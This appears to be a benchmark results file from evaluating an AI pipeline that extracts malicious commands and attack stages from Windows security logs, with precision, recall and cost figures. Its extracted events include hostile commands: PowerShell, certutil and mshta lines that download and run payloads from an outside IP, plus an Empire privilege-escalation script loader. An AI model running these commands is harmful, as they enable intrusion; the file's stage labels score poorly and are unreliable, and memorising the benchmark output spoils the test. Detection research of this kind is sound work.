@@ -1,0 +1,166 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Collection"
+      },
+      {
+        "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /noconfig /fullpaths @\"C:\\Users\\Administrator\\AppData\\Local\\Temp\\4iwlyhn4\\4iwlyhn4.cmdline\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 \"/OUT:C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\RES34B4.tmp\" \"c:\\Users\\Administrator\\AppData\\Local\\Temp\\4iwlyhn4\\CSCE10EFB0F87374A028BB2C41E7AC324B0.TMP\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"]]",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_uttj5ob4.qgk.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ahqkiquo.hnx.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_wqyhhpdp.cd5.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_j5rttxkk.xxq.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_0f3bdq2r.cxe.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1134.001 -TestNumbers 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_m2z44eio.psf.ps1",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "\\[InternetShortcut]\\> %temp%\\\\T1547.009_modified_shortcut.url & echo URL=C:\\windows\\\\system32\\\\calc.exe >> %temp%\\\\T1547.009_modified_shortcut.url & %temp%\\\\T1547.009_modified_shortcut.url",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "C:\\windows\\\\system32\\\\calc.exe",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose}",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo test >> test.exe\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1003.003\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1119\", \"powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1022\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe'; Invoke-AtomicTest T1220\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.003 -GetPrereqs; Invoke-AtomicTest T1059.003\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "invoke-atomictest t1548.002 -testnumbers 2",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c T1059.006.py",
+        "stage": "Collection"
+      },
+      {
+        "command": "certutil.exe -decode a.txt b.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"Invoke-WebRequest http:\\/\\/124\\.223\\.85\\.207:8082\\/Test\\.hta -Method \\\"POST\\\" -UseBasicParsing -ContentType \\\"application\\/json\\\"\\\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "TaskKill /f /IM WordPad.exe",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "net localgroup",
+        "stage": "Discovery"
+      },
+      {
+        "command": "netsh interface portproxy add v4tov4 listenport=65535 connectaddress=127.0.0.1 connectport=22 listenaddress=127.0.0.1 protocol=tcp",
+        "stage": "Lateral Movement"
+      }
+    ],
+    "narrative": "This attack begins with an initial access attempt through unidentified means followed by the use of PowerShell scripts to execute atomic tests, gathering information, evading detection, collecting sensitive data, and escalating privileges. The attackers utilize various techniques, including remote communication, lateral movement, and discovery of system details.",
+    "_parse_ok": false,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 122952,
+      "completion_tokens": 7471,
+      "total_tokens": 130423,
+      "wall_clock_s": 107.982,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.10344827586206896,
+      "recall": 0.21428571428571427,
+      "f1": 0.1395348837209302,
+      "tp": 3,
+      "fp": 26,
+      "fn": 11
+    },
+    "stage": {
+      "precision": 0.034482758620689655,
+      "recall": 0.07142857142857142,
+      "f1": 0.046511627906976744,
+      "tp": 1,
+      "fp": 28,
+      "fn": 13,
+      "recall_partial": 0.14285714285714285
+    },
+    "hallucination_rate": 0.03333333333333333,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 122952,
+      "completion_tokens": 7471,
+      "total_tokens": 130423,
+      "wall_clock_s": 107.982,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
